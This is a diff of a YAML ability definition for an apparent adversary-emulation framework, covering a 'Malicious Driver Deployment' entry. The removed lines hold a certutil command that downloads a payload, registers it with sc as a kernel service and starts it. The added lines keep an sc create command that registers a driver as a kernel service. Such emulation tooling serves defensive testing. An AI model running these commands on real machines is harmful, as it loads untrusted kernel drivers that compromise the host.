@@ -1,6 +1,6 @@
 - id: 9c4e45c8-8f99-40b4-bb73-2e1cfa813034
-  name: 13ab592c51354e97611b4a77859f3ce7 - Malicious Driver Deployment
-  description: 'Malicious driver: 13ab592c51354e97611b4a77859f3ce7
+  name: 9c4e45c8-8f99-40b4-bb73-2e1cfa813034 - Malicious Driver Deployment
+  description: 'Malicious driver: 9c4e45c8-8f99-40b4-bb73-2e1cfa813034
 
     Category: vulnerable driver
 
@@ -16,12 +16,8 @@
   platforms:
     windows:
       cmd:
-        command: 'certutil.exe -urlcache -split -f #{{13ab592c51354e97611b4a77859f3ce7.bin}}
-          %TEMP%\13ab592c51354e97611b4a77859f3ce7.bin && sc create MaliciousDriver
-          binPath= "%TEMP%\13ab592c51354e97611b4a77859f3ce7.bin" type= kernel && sc
-          start MaliciousDriver'
-        payloads:
-        - 13ab592c51354e97611b4a77859f3ce7.bin
+        command: sc create MaliciousDriver binPath= "C:\Windows\System32\drivers\malicious_driver.sys"
+          type= kernel
   singleton: true
   privilege: Elevated
   repeatable: false
